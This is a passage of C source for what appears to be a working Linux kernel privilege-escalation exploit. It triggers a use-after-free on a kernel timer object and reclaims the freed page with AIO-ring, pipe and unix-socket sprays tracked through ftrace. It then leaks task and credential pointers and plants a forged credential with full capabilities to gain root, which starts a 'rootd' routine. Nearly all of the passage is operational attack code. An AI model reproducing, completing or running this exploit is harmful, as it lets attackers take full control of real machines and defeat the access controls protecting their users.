			uint64_t ctx = 0;
			if (syscall(SYS_io_setup, 1, &ctx)) {
				dprintf(STDOUT_FILENO, "[aio] cpu%d stop errno=%d n=%d\n",
					cpu, errno, g_cpu_n[cpu]);
				return NULL;
			}
			g_cpu_ctx[cpu][g_cpu_n[cpu]++] = ctx;
			batch++;
		}
		if (!batch)
			break;
		nanosleep(&pause, NULL);
	}
	return NULL;
}

static int reclaim_and_plant(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + g_kitimer_node;
	uint64_t node_pfn = object_pfn(node_addr);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	pthread_t threads[MAX_CPU];
	int ncpu, other = 0, rings = 0, free_hits = 0, alloc_hits = 0;
	int shown = 0, victim_frees = 0;
	uint64_t victim_base;
	if (node_off + 24 > 4096) {
		dprintf(STDOUT_FILENO, "[plant] node crosses a page off=%#x\n", node_off);
		return -1;
	}
	build_watch();
	victim_base = node_pfn & ~UINT64_C(1);
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[aio] cpus=%d watch=%d node_pfn=%#" PRIx64 "\n",
		ncpu, g_nwatch, node_pfn);
	if (write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n"))
		return -1;
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	for (int cpu = 0; cpu < ncpu; cpu++) {
		if (pthread_create(&threads[cpu], NULL, spray_cpu, (void *)(intptr_t)cpu))
			ncpu = cpu;
	}
	for (int cpu = 0; cpu < ncpu; cpu++)
		pthread_join(threads[cpu], NULL);
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		int lines = 0;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			int filemap = strstr(line, "mm_filemap_add_to_page_cache:") &&
				      strstr(line, "uaf_plant");
			if (strstr(line, "mm_page_free:") && pfn != UINT64_MAX && watch_has(pfn)) {
				free_hits++;
				if (pfn == victim_base || pfn == node_pfn)
					victim_frees++;
				if (shown < 4) {
					dprintf(STDOUT_FILENO, "[free] %s", line);
					shown++;
				}
			}
			if (strstr(line, "mm_page_alloc:") && pfn != UINT64_MAX && watch_has(pfn)) {
				alloc_hits++;
				if (shown < 10) {
					dprintf(STDOUT_FILENO, "[alloc] %s", line);
					shown++;
				}
			}
			if (!filemap)
				continue;
			if (g_hit_index < 0 && pfn == node_pfn) {
				g_hit_cpu = cpu;
				g_hit_index = lines;
			} else if (g_hit_index < 0 && pfn != UINT64_MAX && watch_has(pfn))
				other++;
			lines++;
		}
		fclose(file);
		g_cpu_lines[cpu] = lines;
		rings += g_cpu_n[cpu];
		dprintf(STDOUT_FILENO, "[aio] cpu%d rings=%d filemap=%d\n",
			cpu, g_cpu_n[cpu], lines);
	}
	g_nrings = rings;
	if (g_hit_index >= 0 && g_hit_cpu >= 0 &&
	    g_cpu_lines[g_hit_cpu] == g_cpu_n[g_hit_cpu] &&
	    g_hit_index < g_cpu_n[g_hit_cpu]) {
		uint32_t *ring = (uint32_t *)(uintptr_t)g_cpu_ctx[g_hit_cpu][g_hit_index];
		uint64_t *node;
		if (ring[4] != UINT32_C(0xa10a10a1)) {
			dprintf(STDOUT_FILENO, "[aio] bad magic %#x\n", ring[4]);
			return -1;
		}
		node = (uint64_t *)((char *)ring + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
		__sync_synchronize();
		dprintf(STDOUT_FILENO,
			"[plant] cpu=%d ring=%d ctx=%p off=%#x target=%#" PRIx64 "\n",
			g_hit_cpu, g_hit_index, (void *)ring, node_off, target);
		quiet_reclaim_trace();
		return 0;
	}
	dprintf(STDOUT_FILENO,
		"[aio] victim page missed rings=%d other_timer_pages=%d page_frees=%d page_allocs=%d victim_frees=%d\n",
		rings, other, free_hits, alloc_hits, victim_frees);
	quiet_reclaim_trace();
	return -1;
}

static unsigned long *g_hold;
static int g_nhold;
static pid_t g_holders[4];

static int hold_aio_children(void)
{
	int ready[2];
	if (pipe(ready))
		return -1;
	for (int i = 0; i < 4; i++) {
		pid_t pid = fork();
		if (pid < 0)
			return -1;
		if (pid == 0) {
			int n = 0;
			close(ready[0]);
			while (n < 20000) {
				unsigned long ctx = 0;
				if (syscall(SYS_io_setup, 1, &ctx))
					break;
				n++;
			}
			dprintf(STDOUT_FILENO, "[hold] child=%d rings=%d errno=%d\n",
				i, n, errno);
			if (write(ready[1], "x", 1) != 1)
				_exit(1);
			for (;;)
				pause();
		}
		g_holders[i] = pid;
	}
	close(ready[1]);
	for (int i = 0; i < 4; i++) {
		char bit;
		if (read(ready[0], &bit, 1) != 1)
			return -1;
	}
	close(ready[0]);
	return 0;
}
static int g_nhold;

static int drain_aio(void)
{
	g_hold = calloc(70000, sizeof(*g_hold));
	g_nhold = 0;
	if (!g_hold)
		return -1;
	while (g_nhold < 70000) {
		unsigned long ctx = 0;
		if (syscall(SYS_io_setup, 1, &ctx))
			break;
		g_hold[g_nhold++] = ctx;
	}
	dprintf(STDOUT_FILENO, "[aio-hold] rings=%d errno=%d\n", g_nhold, errno);
	return g_nhold > 1000 ? 0 : -1;
}

static void free_aio_hold(void)
{
	for (int i = 0; i < g_nhold; i++)
		syscall(SYS_io_destroy, g_hold[i]);
	g_nhold = 0;
	free(g_hold);
	g_hold = NULL;
}
static int g_catch[1024][2];
static int g_ncatch;

static int prepare_catch(void)
{
	g_ncatch = 0;
	for (int i = 0; i < 1024; i++) {
		if (pipe(g_catch[i]))
			break;
		if (fcntl(g_catch[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_catch[i][0]);
			close(g_catch[i][1]);
			break;
		}
		g_ncatch++;
	}
	dprintf(STDOUT_FILENO, "[pipe] empty=%d\n", g_ncatch);
	return g_ncatch >= 128 ? 0 : -1;
}

static int reclaim_pipe(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + g_kitimer_node;
	uint64_t node_pfn = object_pfn(node_addr);
	uint64_t victim_base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	unsigned char *page;
	int ncpu, wrote_pages = 0, free_hits = 0, order0 = 0, order1 = 0;
	if (node_off + 24 > 4096)
		return -1;
	page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page == MAP_FAILED)
		return -1;
	memset(page, 0, 4096);
	{
		uint64_t *node = (uint64_t *)(page + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[pipe] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < g_ncatch; i++) {
		int done = 0;
		if ((i % 32) == 0) {
			struct timespec pause = { .tv_nsec = 100000000 };
			pin_cpu((i / 32) % ncpu);
			if (i)
				nanosleep(&pause, NULL);
		}
		while (done < 4096) {
			ssize_t n = write(g_catch[i][1], page + done, (size_t)(4096 - done));
			if (n < 0)
				break;
			done += (int)n;
		}
		if (done == 4096)
			wrote_pages++;
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			if (pfn == UINT64_MAX || !watch_has(pfn))
				continue;
			if (strstr(line, "mm_page_free:"))
				free_hits++;
			if (!strstr(line, "mm_page_alloc:"))
				continue;
			if (pfn != node_pfn && pfn != victim_base)
				continue;
			if (strstr(line, "order=0"))
				order0++;
			if (strstr(line, "order=1"))
				order1++;
			dprintf(STDOUT_FILENO, "[pipe-alloc] %s", line);
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[pipe] wrote=%d frees=%d victim_order0=%d victim_order1=%d\n",
		wrote_pages, free_hits, order0, order1);
	quiet_reclaim_trace();
	munmap(page, 4096);
	return order0 > 0 ? 0 : -1;
}

static int g_stream[4][2];
static int g_nstream;
static unsigned g_shift;
static uint64_t g_task;
static uint64_t g_cred_kva;
static int g_plant_cred;
static int g_wake[2] = { -1, -1 };
static int g_report[2] = { -1, -1 };
static pid_t g_cred_child_pid = -1;

static void close_stream(void)
{
	for (int i = 0; i < g_nstream; i++) {
		if (g_stream[i][0] >= 0)
			close(g_stream[i][0]);
		if (g_stream[i][1] >= 0)
			close(g_stream[i][1]);
		g_stream[i][0] = g_stream[i][1] = -1;
	}
	g_nstream = 0;
}

int pc98260_run_rootd(void);

static int reclaim_stream(uint64_t victim, uint64_t target)
{
	uint64_t base = object_pfn(victim + g_kitimer_node) & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + g_kitimer_node) & 0x1fff);
	unsigned char *pat;
	int big = 16 << 20, hit = 0, writes = 0, ncpu, free_cpu = -1;
	struct timespec wait_start, start, now;
	if (node_off + 24 > 8192)
		return -1;
	pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pat == MAP_FAILED)
		return -1;
	memset(pat, 0, 8192);
	if (g_plant_cred) {
		uint64_t page = PAGE_OFFSET + (base << 12);
		uint64_t node_kva = victim + g_kitimer_node;
		unsigned blob = node_off >= 0x40 ? 0 : 0x1f00;
		uint64_t *cred;
		if (node_off + g_cred_size > 8192 || blob + 32 > 8192 ||
		    page + node_off != node_kva) {
			dprintf(STDOUT_FILENO, "[cred] plant does not fit off=%#x\n",
				node_off);
			munmap(pat, 8192);
			return -1;
		}
		if (!(node_off >= blob + 32 || blob >= node_off + g_cred_size)) {
			dprintf(STDOUT_FILENO, "[cred] blob overlaps node\n");
			munmap(pat, 8192);
			return -1;
		}
		cred = (uint64_t *)(pat + node_off);
		cred[0] = node_kva;
		cred[1] = 0;
		cred[2] = g_task + g_task_cred;
		*(uint64_t *)(pat + node_off + 48) = FULLCAP;
		*(uint64_t *)(pat + node_off + 56) = FULLCAP;
		*(uint64_t *)(pat + node_off + 64) = FULLCAP;
		*(uint64_t *)(pat + node_off + 72) = FULLCAP;
		*(uint64_t *)(pat + node_off + 80) = FULLCAP;
		*(uint64_t *)(pat + node_off + 128) = page + blob;
		*(uint64_t *)(pat + node_off + 136) = slide_addr(g_root_user);
		*(uint64_t *)(pat + node_off + 144) = slide_addr(g_user_ns);
		*(uint64_t *)(pat + node_off + 152) = slide_addr(g_ucounts);
		*(uint64_t *)(pat + node_off + 160) = slide_addr(g_groups);
		dprintf(STDOUT_FILENO,
			"[cred] node=%#" PRIx64 " task+cred=%#" PRIx64 " off=%#x\n",
			node_kva, g_task + g_task_cred, node_off);
	} else {
		unsigned align = node_off % 24u;
		for (unsigned off = align; off + 24 <= 8192; off += 24) {
			uint64_t *node = (uint64_t *)(pat + off);
			node[0] = 0;
			node[1] = 0;
			node[2] = target;
		}
		dprintf(STDOUT_FILENO, "[stream] tile align=%u off=%#x\n", align, node_off);
	}
	g_nstream = 0;
	for (int i = 0; i < 4; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_stream[i]))
			break;
		setsockopt(g_stream[i][0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
		setsockopt(g_stream[i][1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
		fcntl(g_stream[i][0], F_SETFL, O_NONBLOCK);
		g_nstream++;
	}
	if (!g_nstream) {
		munmap(pat, 8192);
		return -1;
	}
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[stream] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
		g_nstream, base, node_off);
	if (write_file(TRACE "/buffer_size_kb", "65536\n")) {
		close_stream();
		return -1;
	}
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss()) {
		close_stream();
		return -1;
	}
	if (g_debug_task) {
		dprintf(STDOUT_FILENO, "[streamdbg] trace armed pfn=%#" PRIx64 "\n", base);
		fflush(stdout);
	}
	atomic_store_explicit(&ipc->exec_ready, 1, memory_order_release);
	clock_gettime(CLOCK_MONOTONIC, &wait_start);
	{
		struct timespec pause = { .tv_nsec = 25000000 };
		for (int i = 0; i < 320 && free_cpu < 0; i++) {
			free_cpu = trace_find_cpu("mm_page_free:", base);
			if (free_cpu >= 0)
				break;
			nanosleep(&pause, NULL);
		}
		clock_gettime(CLOCK_MONOTONIC, &now);
		long wait_ms = (now.tv_sec - wait_start.tv_sec) * 1000L +
			(now.tv_nsec - wait_start.tv_nsec) / 1000000L;
		dprintf(STDOUT_FILENO,
			"[stream] page_freed=%d cpu=%d wait_ms=%ld\n",
			free_cpu >= 0, free_cpu, wait_ms);
		if (g_debug_task && free_cpu < 0) {
			FILE *tf = fopen(TRACE "/trace", "r");
			char line[512];
			int shown = 0, nfree = 0;
			if (tf) {
				while (fgets(line, sizeof(line), tf)) {
					if (strstr(line, "mm_page_free:")) {
						nfree++;
						if (shown < 4) {
							dprintf(STDOUT_FILENO, "[streamdbg] %s", line);
							shown++;
						}
					}
				}
				fclose(tf);
			}
			dprintf(STDOUT_FILENO, "[streamdbg] mm_page_free_lines=%d\n", nfree);
			fflush(stdout);
		}
	}
	clock_gettime(CLOCK_MONOTONIC, &start);
	int spray_cpu = free_cpu >= 0 && free_cpu < ncpu ? free_cpu : 0;
	dprintf(STDOUT_FILENO, "[stream] spray_cpu=%d\n", spray_cpu);
	for (int round = 0; round < 6 && !hit; round++) {
		for (int i = 0, sock = 0; i < 80 && !hit; i++) {
			ssize_t n;
			pin_cpu(spray_cpu);
			n = write(g_stream[sock][0], pat, 8192);
			if (n == 8192)
				writes++;
			else if (++sock >= g_nstream)
				break;
		}
		hit = trace_seen("mm_page_alloc:", base);
		clock_gettime(CLOCK_MONOTONIC, &now);
		if (now.tv_sec - start.tv_sec > 8)
			break;
	}
	write_file(TRACE "/tracing_on", "0\n");
	if (hit)
		dprintf(STDOUT_FILENO, "[stream] hit pfn=%#" PRIx64 "\n", base);
	clock_gettime(CLOCK_MONOTONIC, &now);
	long spray_ms = (now.tv_sec - start.tv_sec) * 1000L +
		(now.tv_nsec - start.tv_nsec) / 1000000L;
	dprintf(STDOUT_FILENO, "[stream] writes=%d hit=%d spray_ms=%ld\n",
		writes, hit, spray_ms);
	quiet_reclaim_trace();
	munmap(pat, 8192);
	if (!hit)
		close_stream();
	return hit ? 0 : -1;
}

static int g_dgram[2] = { -1, -1 };

static int reclaim_dgram(uint64_t victim, uint64_t target)
{
	uint64_t node_pfn = object_pfn(victim + g_kitimer_node);
	uint64_t base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + g_kitimer_node) & 0xfff);
	unsigned char *buf;
	int ncpu, sent = 0, hit = 0, big = 8 << 20;
	int victim_frees = 0, buddy_frees = 0, order2 = 0;
	uint64_t buddy = base ^ UINT64_C(2);
	if (node_off + 24 > 4096)
		return -1;
	buf = mmap(NULL, 16384, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED)
		return -1;
	memset(buf, 0, 16000);
	for (int page = 0; page < 4; page++) {
		unsigned off = (unsigned)page * 4096u + node_off;
		uint64_t *node;
		if (off + 24 > 16000)
			continue;
		node = (uint64_t *)(buf + off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, g_dgram)) {
		munmap(buf, 16384);
		return -1;
	}
	setsockopt(g_dgram[0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
	setsockopt(g_dgram[1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
	fcntl(g_dgram[0], F_SETFL, O_NONBLOCK);
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[dgram] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < 512; i++) {
		struct timespec pause = { .tv_nsec = 40000000 };
		ssize_t n;
		if ((i % 8) == 0)
			pin_cpu((i / 8) % ncpu);
		n = send(g_dgram[0], buf, 16000, MSG_DONTWAIT);
		if (n == 16000)
			sent++;
		else if (i > 16 && sent > 8)
			break;
		if ((i % 8) == 7)
			nanosleep(&pause, NULL);
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn;
			pfn = parse_pfn(line);
			if (pfn == UINT64_MAX)
				continue;
			if (strstr(line, "mm_page_free:") && strstr(line, "order=1")) {
				if (pfn == base)
					victim_frees++;
				if (pfn == buddy)
					buddy_frees++;
			}
			if (!strstr(line, "mm_page_alloc:") || !strstr(line, "order=2"))
				continue;
			order2++;
			if (base == pfn || base == pfn + 2) {
				hit = 1;
				dprintf(STDOUT_FILENO, "[dgram] hit %s", line);
			}
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[dgram] sent=%d hit=%d order2=%d victim_frees=%d buddy_frees=%d buddy=%#" PRIx64 "\n",
		sent, hit, order2, victim_frees, buddy_frees, buddy);
	quiet_reclaim_trace();
	munmap(buf, 16384);
	return hit ? 0 : -1;
}

static int one_uaf(uint64_t target)
{
	pid_t child;
	int code, status = 0;
	int nptr;
	uint64_t victim;
	if (ipc->nhelpers != 0) {
		dprintf(STDOUT_FILENO,
			"[uaf] stale helpers=%d; refusing retry\n", ipc->nhelpers);
		return UAF_POISONED;
	}
	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
	if (ipc)
		atomic_store_explicit(&ipc->exec_ready, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
	child = fork();
	if (child < 0)
		return UAF_SAFE_RETRY;
	if (child == 0) {
		if (g_wake[0] >= 0)
			close(g_wake[0]);
		if (g_wake[1] >= 0)
			close(g_wake[1]);
		if (g_report[0] >= 0)
			close(g_report[0]);
		if (g_report[1] >= 0)
			close(g_report[1]);
		child_race();
		_exit(119);
	}
	(void)setpgid(child, child);
	if (wait_phase(1)) {
		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n",
			atomic_load_explicit(&ipc->phase, memory_order_acquire));
		cleanup_uaf_group(child, &status);
		return UAF_SAFE_RETRY;
	}
	if (write_file(TRACE "/buffer_size_kb", "16384\n") ||
	    trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on()) {
		cleanup_uaf_group(child, &status);
		return UAF_SAFE_RETRY;
	}
	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
	if (wait_phase(3)) {
		dprintf(STDOUT_FILENO, "[uaf] timer was not created\n");
		write_file(TRACE "/tracing_on", "0\n");
		cleanup_uaf_group(child, &status);
		return UAF_SAFE_RETRY;
	}
	write_file(TRACE "/tracing_on", "0\n");
	int victim_index = 1024 + g_padding_timers;
	if (collect_nth(victim_index, &nptr, &victim)) {
		cleanup_uaf_group(child, &status);
		return UAF_SAFE_RETRY;
	}
	if (nptr < 1500 + g_padding_timers) {
		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
		cleanup_uaf_group(child, &status);
		return UAF_SAFE_RETRY;
	}
	if (trigger_cmd("disable_event:kmem:kmem_cache_alloc\n")) {
		cleanup_uaf_group(child, &status);
		return UAF_SAFE_RETRY;
	}
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	atomic_store_explicit(&ipc->phase, 4, memory_order_release);
	if (g_plant_cred)
		g_cred_kva = victim + g_kitimer_node;
	if (reclaim_stream(victim, target)) {
		dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
		stop_helpers();
		reap_helpers_only();
		return UAF_SAFE_RETRY;
	}
	close_socks();
	code = wait_zombie(child, &status);
	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
		child, code, status);
	if (code == 0) {
		dprintf(STDOUT_FILENO, "[uaf] reap timeout; parking unsafe process\n");
		stop_helpers();
		return UAF_POISONED;
	}
	cleanup_uaf_group(child, &status);
	dprintf(STDOUT_FILENO, "[uaf] reaped status=%d\n", status);
	destroy_rings();
	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL; parking\n");
		return UAF_POISONED;
	}
	return 0;
}

static void cred_child(void)
{
	sigset_t block;
	setpgid(0, 0);
	sigfillset(&block);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	g_wake[1] = g_report[0] = -1;
	dprintf(STDOUT_FILENO, "[child-cred] waiting pid=%d\n", getpid());
	for (;;) {
		unsigned uid, euid, gid, egid;
		unsigned char go;
		char msg[96];
		ssize_t got = read(g_wake[0], &go, 1);
		if (got < 0 && errno == EINTR)
			continue;
		if (got != 1) {
			dprintf(STDOUT_FILENO,
				"[child-cred] wake pipe closed n=%zd errno=%d; parking\n",
				got, errno);
			for (;;)
				pause();
		}
		uid = getuid();
		euid = geteuid();
		gid = getgid();
		egid = getegid();
		snprintf(msg, sizeof(msg), "uid=%u euid=%u gid=%u egid=%u\n",
			 uid, euid, gid, egid);
		if (write(g_report[1], msg, strlen(msg)) < 0)
			dprintf(STDOUT_FILENO, "[child-cred] answer errno=%d\n", errno);
		dprintf(STDOUT_FILENO, "[child-cred] %s", msg);
		if (uid == 0 && euid == 0) {
			int rootd_rc = pc98260_run_rootd();
			dprintf(STDOUT_FILENO,
				"[child-cred] rootd returned rc=%d; parking\n", rootd_rc);
			for (;;)
				pause();
		}
	}
}

static void log_proc_uid(pid_t pid)
{
	char path[64];
	char line[160];
	FILE *file;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
	file = fopen(path, "r");
	if (!file)
		return;
	while (fgets(line, sizeof(line), file)) {
		if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
		    !strncmp(line, "State:", 6))
			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
	}
	fclose(file);
}

static int ask_child(unsigned *uid, unsigned *euid)
{
	char buf[80];
	struct pollfd pfd;
	unsigned char go = 1;
	ssize_t n;
	if (kill(g_cred_child_pid, 0) != 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d is dead errno=%d\n",
			g_cred_child_pid, errno);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	fcntl(g_report[0], F_SETFL, O_NONBLOCK);
	while (read(g_report[0], buf, sizeof(buf)) > 0)
		;
	fcntl(g_report[0], F_SETFL, 0);
	if (write(g_wake[1], &go, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred] ask write errno=%d\n", errno);
		return -1;
	}
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 2000) <= 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d stayed silent\n",
			g_cred_child_pid);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	n = read(g_report[0], buf, sizeof(buf) - 1);
	if (n < 0) {
		dprintf(STDOUT_FILENO, "[cred] answer read errno=%d\n", errno);
		return -1;
	}
	buf[n > 0 ? n : 0] = 0;
	dprintf(STDOUT_FILENO, "[cred] answer %s", buf);
	if (sscanf(buf, "uid=%u euid=%u", uid, euid) == 2)
		return 0;
	return -1;
}

static int leak_task(void)
{
	uint8_t *buf;
	int hits = 0;
	if (pipe(g_wake) || pipe(g_report))
		return -1;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss() ||
	    trace_off_on())
		return -1;
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return -1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	write_file(TRACE "/tracing_on", "0\n");
	buf = malloc(4U << 20);
	if (!buf)
		return -1;
	for (int cpu = 0; cpu < 8; cpu++) {
		char path[128];
		size_t used = 0;
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		for (;;) {
			ssize_t n = read(fd, buf + used, (4U << 20) - used);
			if (n <= 0)
				break;
			used += (size_t)n;
			if (used + 65536 >= (4U << 20))
				break;
		}
		close(fd);
		if (g_debug_task) {
			dprintf(STDOUT_FILENO, "[taskdbg] cpu%d used=%zu\n", cpu, used);
			int shown = 0;
			for (size_t i = 0; i + 48 <= used && shown < 24; i += 8) {
				uint64_t w0, w1, w2, w3, w4, w5;
				memcpy(&w0, buf + i, 8);
				memcpy(&w1, buf + i + 8, 8);
				memcpy(&w2, buf + i + 16, 8);
				memcpy(&w3, buf + i + 24, 8);
				memcpy(&w4, buf + i + 32, 8);
				memcpy(&w5, buf + i + 40, 8);
				if ((w0 >> 48) != 0xffff || (w1 >> 48) != 0xffff)
					continue;
				dprintf(STDOUT_FILENO,
					"[taskdbg] cpu%d off=%zu %#lx %#lx %#lx %#lx %#lx %#lx\n",
					cpu, i, (unsigned long)w0, (unsigned long)w1,
					(unsigned long)w2, (unsigned long)w3,
					(unsigned long)w4, (unsigned long)w5);
				shown++;
			}
		}
		for (size_t i = 0; i + 32 <= used; i++) {
			uint64_t site, ptr, req;
			memcpy(&req, buf + i + 24, 8);
		if (req != g_task_size)
				continue;
			memcpy(&site, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
				continue;
			g_task = ptr;
			hits++;
			dprintf(STDOUT_FILENO, "[task] site=%#" PRIx64 " ptr=%#" PRIx64 "\n",
				site, ptr);
		}
	}
	free(buf);
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	write_file(TRACE "/tracing_on", "0\n");
	return hits ? 0 : -1;
}

static int leak_cred(uint64_t *cred)
{
	uint64_t ptrs[8];
	int n;
	if (trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") || kick_rss())
		return -1;
	if (trace_off_on())
		return -1;
	if (syscall(SYS_setresuid, -1, -1, -1))
		dprintf(STDOUT_FILENO, "[cred] setresuid errno=%d\n", errno);
	write_file(TRACE "/tracing_on", "0\n");
	n = collect_site(slide_addr(g_cred_link), g_cred_size, ptrs, 8);
	dprintf(STDOUT_FILENO, "[cred] ptrs=%d\n", n);
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	if (n < 1)
		return -1;
	*cred = ptrs[n - 1];
	dprintf(STDOUT_FILENO, "[cred] object=%#" PRIx64 "\n", *cred);
	return 0;
}

static void read_enforce(void)
{
	char buf[8] = { 0 };
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		dprintf(STDOUT_FILENO, "[selinux] enforce read errno=%d\n", errno);
		return;
	}
	if (read(fd, buf, sizeof(buf) - 1) > 0)
		dprintf(STDOUT_FILENO, "[selinux] enforce=%s", buf);
	close(fd);
}

static void park_poisoned_process(void)
{
	dprintf(STDOUT_FILENO,
		"[uaf] unsafe state; holding process until reboot\n");
	for (;;)
		pause();
}

int pc98260_run_rootd(void);

int main(int argc, char **argv)
{
	struct sigaction action = { .sa_handler = on_alarm };
	int preflight = 0;
	if (argc > 1 && !strcmp(argv[1], "--exec-ok"))
		_exit(0);
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--preflight")) {
			preflight = 1;
		} else if (!strcmp(argv[i], "--slide") && i + 1 < argc) {
			g_slide = strtoull(argv[++i], NULL, 0);
		} else if (!strcmp(argv[i], "--profile") && i + 1 < argc) {
			if (set_kernel_profile(argv[++i])) {
				dprintf(STDERR_FILENO, "unknown profile: %s\n", argv[i]);
				return 2;
			}
		} else if (!strcmp(argv[i], "--timer-link") && i + 1 < argc) {
			g_timer_link = strtoull(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--cred-link") && i + 1 < argc) {
			g_cred_link = strtoull(argv[++i], NULL, 0);
			g_profile = "custom";
		} else if (!strcmp(argv[i], "--kitimer-node") && i + 1 < argc) {
			g_kitimer_node = (unsigned)strtoul(argv[++i], NULL, 0);
